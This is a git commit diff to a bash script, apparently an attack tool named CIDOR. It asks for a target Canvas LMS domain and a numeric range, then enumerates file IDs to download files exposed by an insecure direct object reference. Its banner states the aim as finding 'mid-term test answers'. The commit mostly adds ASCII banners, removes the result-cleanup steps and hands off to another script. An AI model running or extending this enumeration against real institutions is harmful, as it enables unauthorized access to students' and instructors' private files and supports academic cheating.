c6d43daf907db4877150a3e8af785c7c81d64d7d
n3on <97998625+n3onhacks@users.noreply.github.com>
2022-01-20 13:10:56 -0600

    Update cidor.sh

--- cidor.sh
+++ cidor.sh
@@ -2,10 +2,25 @@
 #A quick little bashscript by n3on @n3onhacks
 
 #Menu
-echo "CIDOR - Canvas IDOR checker v.2.0.1"
-echo "Usage: checks domain/[num]/files to check for accessible files via Canvas IDOR (CIDOR) issue"
-echo "...cleaning previous results..."
-
+echo "============================================================================"
+echo "============================================================================"
+echo "============================================================================"
+echo "====           ===   ===   =     =======            ======      ============"
+echo "====   ===========   ===   ==     ====     =======    ====   ==        ====="
+echo "====   ===========   ===   ====    ===     =======     ==    =======    ===="
+echo "====   ===========   ===   ====     ==     =======     ==    ==============="
+echo "====   ===========   ===   =====    ===    =======     ==    ==============="
+echo "====   ===========   ===   =====    ===    =======     ==    ==============="
+echo "====           ===   ===           =====              ===    ==============="
+echo "============================================================================"
+echo "============================================================================"
+echo "================= CIDOR - Canvas IDOR asset DLr v.2.1.0 ===================="
+echo "============================ by @n3onhacks ================================="
+echo "============================================================================"
+echo "============================================================================"
+echo "======= build to fuzz a location with historically the best results ========"
+echo "============================================================================"
+echo "============================================================================"
 #Target Selection, Options
 echo "SELECT your TARGET (ex: canvas.uchicago.edu):"
 read DOMAIN
@@ -13,7 +28,21 @@ echo "What number would you like to START FUZZING at? (ex: 300):"
 read FIRST
 echo "What number would you like to STOP FUZZING at? (ex: 10000):"
 read NUMBER
-echo "..::Starting Canvas IDOR::.."
+echo "============================================================================"
+echo "============================================================================"
+echo "=== S ======================================================================"
+echo "=== T ======================================================================"
+echo "=== A ======================================================================"
+echo "=== R ======================================================================"
+echo "=== T ======================================================================"
+echo "=== I ======================================================================"
+echo "=== N ======================================================================"
+echo "=== G ======================================================================"
+echo "============================================================================"
+echo "===== Lets find some mid-term test answers (view POC video on github) ======"
+echo "============================================================================"
+echo "============================================================================"
+echo "============================================================================"
 
 #URL Layout Options
 a="https://"
@@ -36,26 +65,5 @@ do
 	echo ${a}${b}${c}${d}${e}
 	done
 
-#Pre-results
-echo "Completed. Querying through logs....."
-cat /opt/cidor/temp/cidor_results.txt | grep -B 22 "50K .........." > /opt/cidor/temp/cleaner1.txt 
-cat /opt/cidor/temp/cleaner1.txt | grep "Saving to" | cut -d " " -f 3 | tr -d ":" > /opt/cidor/temp/cleaner2.txt
-cat /opt/cidor/temp/cleaner2.txt | awk '{print substr($0,2,length($0)-2)}' > /opt/cidor/temp/clean.txt
-
-#Final Horrahc
-File="/opt/cidor/temp/clean.txt"
-echo "#!/bin/bash" > /opt/cidor/temp/final_results.sh
-Lines=$(cat $File)
-for Line in $Lines
-do
-echo "cp /opt/cidor/temp/'$Line' /opt/cidor/downloads" > /opt/cidor/temp/updated_results.txt
-cat /opt/cidor/temp/updated_results.txt > /opt/cidor/temp/final_results.sh
-chmod 777 /opt/cidor/temp/final_results.sh
-./final_results.sh
-
-cat /opt/cidor/temp/cleaner1.txt
-echo "Application/Pdf Files Revieved:"
-ls -l /opt/cidor/downloads/
-
-
-done
+cd ..
+./ifiles.sh
